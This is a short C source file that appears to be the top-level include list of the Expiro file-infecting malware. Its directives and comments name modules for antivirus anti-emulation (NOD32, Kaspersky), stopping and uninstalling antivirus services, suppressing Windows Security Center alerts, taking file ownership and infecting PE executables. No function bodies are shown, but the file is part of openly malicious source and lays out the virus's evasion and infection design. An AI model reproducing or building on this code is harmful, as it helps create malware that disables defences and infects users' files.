
#include "expiro\expiro.h" // all config


#ifndef NODBGPRINT
#include "dbg.h"
#endif


#include "api\kernel32.h"
#include "api\crtdll.h"
#include "api\user32.h"
#include "api\sfc.h"
#include "api\sfc_os.h"
#include "api\shell32.h"
#include "api\advapi32.h"
#include "api\api.h" // this should be included last of api or we got GPF!
#include "api\wininet.h"
#include "api\urlmon.h"
#include "api\crypt32.h"

#include "antiav\antiemul.c" // NOD32 & KAV(win32) anti-emulation

#include "strings\serstr.c"
#include "strings\rndstr.c"
#include "strings\lowerstr.c"
#include "strings\my_strcpy.c"

#include "antiav\avsvc.c" // svc stop-list for service mode
// #include "_antiav\_avprc.c" // prc stop-list for service mode
// #include "_antiav\_killwsc.c" // kill Windows Security Center notifications
// #include "_antiav\_avunist.c" // av uninstall for service mode

#include "token.c" // EditOwnToken (take_ownership)
#include "glob.c"

#include "infect\pehead.h"
#include "infect\c_code.h"
#include "infect\c_code.c"
#include "infect\peinf.c"
#include "infect\getdll.c"

#include "infect\softfind.c"
#include "infect\fileown.c"
#include "infect\rscan.c"

#include "kernel.c"  // basic Find Kernel32 routines
#include "service.c"

#include "addons\addons.h"


